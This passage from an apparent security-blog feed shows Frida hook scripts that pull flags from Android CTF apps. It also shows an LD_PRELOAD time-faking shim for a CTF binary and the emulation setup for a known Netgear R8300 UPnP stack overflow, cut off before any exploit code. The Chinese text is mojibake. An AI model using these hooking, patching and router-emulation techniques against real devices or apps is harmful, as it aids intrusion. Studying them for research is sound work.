title="0xa"></a>0xa</h3><p>è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ç›´æ¥hookæ‰android_log_printå‡½æ•°ï¼Œå› ä¸ºåœ¨get_flagä¸­è¯¥å‡½æ•°çš„å‚æ•°åŒ…å«ä¸€ä¸ªflagçš„æŒ‡é’ˆï¼Œå¦‚æ­¤ä¾¿å¯ä»¥è·å¾—flagçš„å€¼</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0xa.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.onCreate.<span class="built_in">call</span>(<span class="keyword">this</span>, bundle);</span><br><span class="line">        </span><br><span class="line">        var get_flag = <span class="keyword">new</span> <span class="built_in">NativeFunction</span>(</span><br><span class="line">            Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>, <span class="string">&quot;_Z8get_flagii&quot;</span>),</span><br><span class="line">            <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]</span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">get_flag</span>(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Interceptor.<span class="built_in">attach</span>(Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;liblog.so&quot;</span>, <span class="string">&quot;__android_log_print&quot;</span>), &#123;</span><br><span class="line">        onEnter: <span class="built_in">function</span>(args) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">1</span>]).<span class="built_in">includes</span>(<span class="string">&quot;FLAG&quot;</span>)) &#123;</span><br><span class="line">                console.<span class="built_in">log</span>(<span class="string">&quot;[FLAG] &quot;</span> + Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">3</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="0xb"><a href="#0xb" class="headerlink" title="0xb"></a>0xb</h3><p>è¿™é‡Œå‘ç°åœ¨getflagå‡½æ•°ä¸­ï¼Œå…¶ä¸­çš„é€»è¾‘å¯¼è‡´æ— æ³•å¯¹å‡½æ•°ä½“è¿›è¡Œåˆç†çš„åˆ©ç”¨ï¼Œå› æ­¤è€ƒè™‘ç›´æ¥å¯¹jnzè¿›è¡Œä¸€ä¸ªnopï¼Œä¹Ÿæˆ–è€…å¯ä»¥ç›´æ¥hookè·³åˆ°æ­£ç¡®çš„å‡½æ•°ä½“</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    Interceptor.<span class="built_in">attach</span>(Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;liblog.so&quot;</span>, <span class="string">&quot;__android_log_print&quot;</span>), &#123;</span><br><span class="line">        onEnter: <span class="built_in">function</span>(args) &#123;</span><br><span class="line">            var tag = Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (tag.<span class="built_in">includes</span>(<span class="string">&quot;FLAG&quot;</span>)) &#123;</span><br><span class="line">                console.<span class="built_in">log</span>(<span class="string">&quot;[FLAG] &quot;</span> + Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">3</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Java.<span class="built_in">choose</span>(<span class="string">&quot;com.ad2001.frida0xb.MainActivity&quot;</span>, &#123;</span><br><span class="line">        onMatch: <span class="built_in">function</span>(obj) &#123;</span><br><span class="line">            Interceptor.<span class="built_in">attach</span>(Module.<span class="built_in">getExportByName</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>, <span class="string">&quot;Java_com_ad2001_frida0xb_MainActivity_getFlag&quot;</span>), &#123;</span><br><span class="line">                onEnter: <span class="built_in">function</span>(args) &#123;</span><br><span class="line"></span><br><span class="line">                    Memory.<span class="built_in">protect</span>(Module.<span class="built_in">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="built_in">add</span>(<span class="number">0x170ce</span>), <span class="number">4</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">                    <span class="keyword">new</span> <span class="built_in">X86Writer</span>(Module.<span class="built_in">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="built_in">add</span>(<span class="number">0x170ce</span>)).<span class="built_in">putNop</span>().<span class="built_in">flush</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            obj.<span class="built_in">getFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥äº†</p><blockquote><p>PSï¼šæœ€åå‘ç°æ— éœ€hookæ‰æ—¥å¿—è¾“å‡ºå‡½æ•°ï¼Œå…¶å®ä¸€å¼€å§‹å°±åº”è¯¥æ˜ç™½çš„ï¼Œæ¯•ç«Ÿæœºå™¨éƒ½rootäº†ï¼Œæ€ä¹ˆè¿˜çœ‹ä¸äº†æ—¥å¿—ï¼ˆï¼Œadbä¸­å°±æœ‰logcatï¼Œå¯æ¶!!</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Androidè¿è¡Œæœºåˆ¶&quot;&gt;&lt;a href=&quot;#Androidè¿è¡Œæœºåˆ¶&quot; class=&quot;headerlink&quot; title=&quot;Androidè¿è¡Œæœºåˆ¶&quot;&gt;&lt;/a&gt;Androidè¿è¡Œæœºåˆ¶&lt;/h2&gt;&lt;p&gt;ä¸€èˆ¬è€Œè¨€ï¼Œåœ¨å¯åŠ¨ä¸€ä¸ª App æ—¶ï¼ŒAndroid ä¼šé¦–å…ˆæ‰§è¡Œ App</summary>
      
    
    
    
    <category term="å®‰å“é€†å‘" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>å›ºä»¶ä¸‹çš„hook &amp; patch</title>
    <link href="http://s1nec-1o.github.io/2025/03/03/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E7%9A%84hook-patch/"/>
    <id>http://s1nec-1o.github.io/2025/03/03/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E7%9A%84hook-patch/</id>
    <published>2025-03-03T08:26:16.000Z</published>
    <updated>2025-03-03T08:31:04.581Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å›ºä»¶ä¸‹çš„how2hook-how2patch"><a href="#å›ºä»¶ä¸‹çš„how2hook-how2patch" class="headerlink" title="å›ºä»¶ä¸‹çš„how2hook &amp; how2patch"></a>å›ºä»¶ä¸‹çš„how2hook &amp; how2patch</h1><p>åœ¨æ¨¡æ‹Ÿå›ºä»¶çš„æ—¶å€™é€šå¸¸éœ€è¦æˆ‘ä»¬è‡ªå·±å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œpatchå’Œhookï¼Œä½†æ— è®ºæ˜¯patchè¿˜æ˜¯hookï¼Œéƒ½æ˜¯é€šè¿‡ä¿®æ”¹ï¼ˆåŠ«æŒï¼‰äºŒè¿›åˆ¶æ–‡ä»¶çš„æ‰§è¡Œæµç¨‹æ¥è¾¾åˆ°å›ºä»¶é¡ºåˆ©å¯åŠ¨çš„ç›®çš„ã€‚</p><h2 id="BIN-100"><a href="#BIN-100" class="headerlink" title="BIN-100"></a>BIN-100</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(encoded_flag, &amp;byte_400A7E, <span class="built_in">sizeof</span>(encoded_flag));</span><br><span class="line">  stack_canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  data_pointer = obfuscated_key;</span><br><span class="line">  <span class="keyword">for</span> ( index_outer_loop = <span class="number">9LL</span>; index_outer_loop; --index_outer_loop )</span><br><span class="line">    *data_pointer++ = <span class="number">0</span>;</span><br><span class="line">  remaining_iterations = <span class="number">0x31337</span>;</span><br><span class="line">  initial_time = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">36</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      current_length = <span class="number">0LL</span>;</span><br><span class="line">      current_time = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">srand</span>(<span class="number">0xDEFACED</span> - initial_time + current_time);</span><br><span class="line">      previous_byte = obfuscated_key[i];</span><br><span class="line">      obfuscated_key[i] = <span class="built_in">rand</span>() ^ previous_byte;</span><br><span class="line">      funny_element = (&amp;funny)[i];</span><br><span class="line">      <span class="keyword">while</span> ( current_length &lt; <span class="built_in">strlen</span>(funny_element) )</span><br><span class="line">      &#123;</span><br><span class="line">        character_value = funny_element[current_length];</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)character_value == <span class="string">&#x27;i&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          formatted_string[(<span class="type">int</span>)current_length] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (_DWORD)current_length &amp;&amp; funny_element[current_length - <span class="number">1</span>] != <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">            ctype_function = __ctype_toupper_loc();</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            ctype_function = __ctype_tolower_loc();</span><br><span class="line">          formatted_string[(<span class="type">int</span>)current_length] = (*ctype_function)[character_value];</span><br><span class="line">        &#125;</span><br><span class="line">        ++current_length;</span><br><span class="line">      &#125;</span><br><span class="line">      formatted_string[(<span class="type">int</span>)current_length] = <span class="number">0</span>;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot; â™« %80s â™«\n&quot;</span>, formatted_string);</span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    --remaining_iterations;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( remaining_iterations );</span><br><span class="line">  key_pointer = obfuscated_key;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;KEY: &quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    byte_value = (<span class="type">unsigned</span> __int8)*key_pointer++;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%02x &quot;</span>, byte_value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( key_pointer != encoded_flag );</span><br><span class="line">  flag_index = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;OK YOU WIN. HERE&#x27;S YOUR FLAG: &quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    decoded_char = encoded_flag[flag_index] ^ obfuscated_key[flag_index];</span><br><span class="line">    ++flag_index;</span><br><span class="line">    <span class="built_in">putchar</span>(decoded_char);  <span class="comment">//è¾“å‡ºflag</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( flag_index != <span class="number">36</span> );</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®æˆ‘ä»¬å‘ç°è¿™ä¸ªdemoçš„å¾ªç¯æ¬¡æ•°ä¹Ÿç®—æ˜¯æ¯”è¾ƒå°‘çš„ï¼Œä¸»è¦åœ¨äºå¦‚ä½•åŠ å¿«è¿™ä¸ªè¿‡ç¨‹ï¼Œå‘ç°æœ‰ä¸ªsleep(1u)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨LD_PRELOADå¯¹sleepè¿›è¡Œhookï¼Œç„¶ånopæ‰ä¸€äº›æ— ç”¨çš„å‡½æ•°ï¼Œå¦‚printf</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; cat hook2.c</span><br><span class="line"><span class="comment">// gcc -shared -fPIC hook2.c -o hook2.so</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> t=<span class="number">0x31337</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">sleep</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> seconds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    t++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">time</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹å</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=<span class="variable">$PWD</span>/hook2.so ./elf &gt;tmp</span><br><span class="line"><span class="built_in">tail</span> tmp</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼šp4ul_1z_d34d_1z_wh4t_th3_r3c0rd_s4ys</p><h2 id="å®æˆ˜ï¼"><a href="#å®æˆ˜ï¼" class="headerlink" title="å®æˆ˜ï¼"></a>å®æˆ˜ï¼</h2><h3 id="PSV-2020-0211"><a href="#PSV-2020-0211" class="headerlink" title="PSV-2020-0211"></a>PSV-2020-0211</h3><p>netgear R8300 1.0.2.130 çš„upnpä¸­å­˜åœ¨æ ˆæº¢å‡ºçš„æ¼æ´ï¼Œä¸»è¦å­¦ä¹ <strong>åˆ©ç”¨æ‰‹æ³•</strong>ï¼ŒNVram hookæ‰‹æ³•ï¼ŒPocç¼–å†™ ä»¥åŠ è°ƒè¯•æŠ€å·§</p><ul><li>**UPnP (Universal Plug and Play)**ï¼šç°åœ¨ç”±å¼€æ”¾è¿æ¥åŸºé‡‘ä¼šç®¡ç†çš„æ˜¯ä¸€å¥—ç½‘ç»œåè®®ï¼Œå®ƒå…è®¸ç½‘ç»œè®¾å¤‡æ— ç¼åœ°å‘ç°å½¼æ­¤åœ¨ç½‘ç»œä¸Šçš„å­˜åœ¨ï¼Œå¹¶ä¸ºæ•°æ®å…±äº«ã€é€šä¿¡å’Œå¨±ä¹å»ºç«‹åŠŸèƒ½ç½‘ç»œæœåŠ¡ã€‚</li></ul><p>UPnPä¼šå°†æŸä¸ªç«¯å£è¿æ¥åˆ°<strong>å¤šæ’­ç»„</strong>ï¼Œå³å…è®¸æ¥æ”¶å…¶ä»–å®¢æˆ·ç«¯ä¼ è¾“æ•°æ®ï¼ˆä¸€å¯¹å¤šï¼‰ã€æˆ–è®¸å°±æ˜¯é€šè¿‡è¿™ä¸ªæ¥ä½¿å¾—ç½‘ç»œè®¾å¤‡å¯ä»¥æ— ç¼å‘ç°å½¼æ­¤æ‰’ã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503031630751.png" alt="image-20250228222327229"></p><p>æ¼æ´çœ‹ç€æ˜¯å¾ˆç®€å•çš„ï¼Œä½†æ˜¯ç”±äºsub_25E04æ˜¯é€šè¿‡strcpyæ¥æ ˆæº¢å‡ºçš„ï¼Œå› æ­¤\x00æˆªæ–­ä¾¿æ˜¯ä¸å¯ç»•è¿‡çš„éšœç¢ï¼Œè€ŒåŸä½œè€…çš„åˆ©ç”¨æ‰‹æ³•å€¼å¾—å­¦ä¹ </p><p>å¯åŠ¨æœåŠ¡ï¼šè¿™æ¬¡ä½¿ç”¨ç”¨æˆ·æ¨¡å¼è¿è¡Œ</p><p>å› ä¸ºæ¶‰åŠåˆ°nvramï¼Œä½¿ç”¨LD_PRELOAD HookæŠ€æœ¯ï¼Œç½‘ä¸Šæœ‰äººå·²ç»å†™å¥½äº†é’ˆå¯¹netgear R6250&#x2F;6400çš„nvram hookï¼Œå¯¹äºR8300ä¹Ÿæ˜¯é€‚ç”¨çš„ <a href="https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c">https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c</a></p><p>ä½¿ç”¨buildrootè¿›è¡Œäº¤å‰ç¼–è¯‘</p><p>é¦–å…ˆæ„é€ buildroot</p><p>ä¸‹è½½åœ°å€: <a href="https://buildroot.org/download.html%EF%BC%8C%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AA%E6%9C%80%E6%96%B0%E7%9A%84%E7%89%88%E6%9C%AC">https://buildroot.org/download.htmlï¼Œä¸‹è½½ä¸€ä¸ªæœ€æ–°çš„ç‰ˆæœ¬</a></p><p>ç„¶å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/buildroot-2024.11</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>Target Option -&gt; Target Architeâ€¦ -&gt; Arm little endian</p><p>ä¹‹åfileéšä¾¿ä¸€ä¸ªnvramçš„æ–‡ä»¶ï¼Œå‘ç°æ˜¯uClibc</p><p>å› æ­¤toolchain-&gt;C library-&gt;uClibc</p><p>ä½†æ˜¯åœ¨ç¼–è¯‘ä¹‹å‰éœ€è¦å…ˆæ¢æºï¼Œè¿™æ ·å¯ä»¥èŠ‚çœä¸€å¤§å †çš„æ—¶é—´</p><p>Build Option -&gt; Mirrors and Download locations -&gt; </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//sources.buildroot.net                              </span></span><br><span class="line">https:<span class="comment">//mirrors.aliyun.com/linux-kernel</span></span><br><span class="line">https:<span class="comment">//mirrors.aliyun.com/gnu </span></span><br><span class="line">https:<span class="comment">//luarocks.cn                         </span></span><br><span class="line">https:<span class="comment">//mirrors.aliyun.com/CPAN</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå¤šæ¬¡escé€€å‡ºï¼Œç„¶åæ‰§è¡Œ<code>make toolchain -j4 V=0</code></p><ol><li><strong>images&#x2F;</strong>  <ul><li>å­˜æ”¾ç¼–è¯‘åç”Ÿæˆçš„æ‰€æœ‰é•œåƒæ–‡ä»¶ï¼ŒåŒ…æ‹¬å†…æ ¸é•œåƒã€åŠ è½½å¼•å¯¼é•œåƒå’Œæ ¹æ–‡ä»¶ç³»ç»Ÿé•œåƒã€‚</li><li>è¿™äº›é•œåƒç”¨äºåœ¨ç›®æ ‡è®¾å¤‡ä¸Šå¯åŠ¨å’Œè¿è¡Œæ“ä½œç³»ç»Ÿã€‚</li></ul></li><li><strong>build&#x2F;</strong>  <ul><li>å­˜æ”¾æ‰€æœ‰æ„å»ºç»„ä»¶çš„ç›®å½•ï¼Œé™¤äº†äº¤å‰ç¼–è¯‘å·¥å…·é“¾çš„ç»„ä»¶ã€‚</li><li>æ¯ä¸ªåŠŸèƒ½å¯¹åº”ä¸€ä¸ªå­ç›®å½•ï¼ŒåŒ…å«è¯¥åŠŸèƒ½æ‰€éœ€çš„æ‰€æœ‰ç»„ä»¶ã€‚</li><li>ä¾‹å¦‚ï¼Œå†…æ ¸ã€åº“ã€åº”ç”¨ç¨‹åºç­‰åœ¨è¿™é‡Œè¿›è¡Œç¼–è¯‘å’Œé…ç½®ã€‚</li></ul></li><li><strong>staging&#x2F;</strong>  <ul><li>åŒ…å«ä¸€ä¸ªç±»ä¼¼äºæ ¹æ–‡ä»¶ç³»ç»Ÿçš„å±‚æ¬¡ç»“æ„ã€‚</li><li>è¿™ä¸ªç›®å½•åŒ…å«å·²å®‰è£…çš„äº¤å‰ç¼–è¯‘å·¥å…·é“¾å’Œæ‰€æœ‰ä¸ºç›®æ ‡æ¿é€‰æ‹©çš„ç”¨æˆ·ç©ºé—´åŒ…ã€‚</li><li>ç”¨äºå‡†å¤‡æœ€ç»ˆçš„æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚</li></ul></li><li><strong>target&#x2F;</strong>  <ul><li>åŒ…å«æ ¹æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´ç»“æ„ï¼Œä½†ä¸èƒ½ç›´æ¥ç”¨äºå¼€å‘æ¿ã€‚</li><li>è¿™ä¸ªç›®å½•æ˜¯æ„å»ºè¿‡ç¨‹ä¸­ç”Ÿæˆçš„æ–‡ä»¶ç³»ç»Ÿçš„ä¸­é—´çŠ¶æ€ã€‚</li></ul></li><li><strong>host&#x2F;</strong>  <ul><li>åŒ…å«æ„å»ºè¿‡ç¨‹ä¸­éœ€è¦çš„äº¤å‰ç¼–è¯‘å·¥å…·é›†ã€‚</li><li>ç”¨äºåœ¨ä¸»æœºç³»ç»Ÿä¸Šç¼–è¯‘ç›®æ ‡ç³»ç»Ÿçš„ä»£ç ã€‚</li><li>æä¾›äº†ç¼–è¯‘å™¨ã€é“¾æ¥å™¨å’Œå…¶ä»–å¿…è¦çš„å¼€å‘å·¥å…·ã€‚</li></ul></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/buildroot<span class="number">-2024.11</span>/output/host/bin </span><br><span class="line"><span class="keyword">export</span> PATH=$PATH:$(pwd)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-gcc -c -O2 -fPIC -Wall ./nvram1.c -o ./nvram1.o</span><br><span class="line">arm-linux-gcc -shared -nostdlib  ./nvram1.o -o ./nvram1.so</span><br></pre></td></tr></table></figure><p>ä¹‹ååˆ›å»º&#x2F;tmp&#x2F;nvram.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">upnpd_debug_level</span>=<span class="number">9</span></span><br><span class="line"><span class="attr">lan_ipaddr</span>=<span class="number">192.168</span>.<span class="number">122.167</span></span><br><span class="line"><span class="attr">hwver</span>=R8500</span><br><span class="line"><span class="attr">friendly_name</span>=R8300</span><br><span class="line"><span class="attr">upnp_enable</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">upnp_turn_on</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">upnp_advert_period</span>=<span class="number">30</span></span><br><span class="line"><span class="attr">upnp_advert_ttl</span>=<span class="number">4</span></span><br><span class="line"><span class="attr">upnp_portmap_entry</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">upnp_duration</span>=<span class="number">3600</span></span><br><span class="line"><span class="attr">upnp_DHCPServerConfigurable</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">wps_is_upnp</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">upnp_sa_uuid</span>=<span class="number">00000000000000000000</span></span><br><span class="line"><span class="attr">lan_hwaddr</span>=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><p>ä¹‹åçš„lan_ipaddrè¿˜è¦è¿æ¥ï¼Œå› æ­¤è¦æŠŠipèµ·èµ·æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip addr add 192.168.122.167/24 dev virbr0</span><br><span class="line">ip addr show virbr0</span><br></pre></td></tr></table></figure><p>æ˜¾ç¤ºå¯¹åº”çš„ipå°±ä»£è¡¨æˆåŠŸå•¦</p><p>ä¹‹å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -E LD_PRELOAD=&quot;./nvram1.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -i | grep qemu                                                                     </span><br><span class="line">qemu-arm- 6267            root    3u  IPv4  93141      0t0  UDP *:1900 </span><br><span class="line">qemu-arm- 6267            root    4u  IPv4  93142      0t0  UDP *:45791 </span><br><span class="line">qemu-arm- 6267            root    5u  IPv4  93143      0t0  TCP *:5000 (LISTEN)</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤ç¨‹åºå°±èµ·èµ·æ¥äº†ï¼Œå°±å¯ä»¥å¼€å§‹Pocçš„ç¼–å†™äº†</p><p>è°ƒè¯•ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-<span class="type">static</span> -g <span class="number">1234</span> -E LD_PRELOAD=<span class="string">&quot;./nvram1.so ./lib/libdl.so.0&quot;</span> 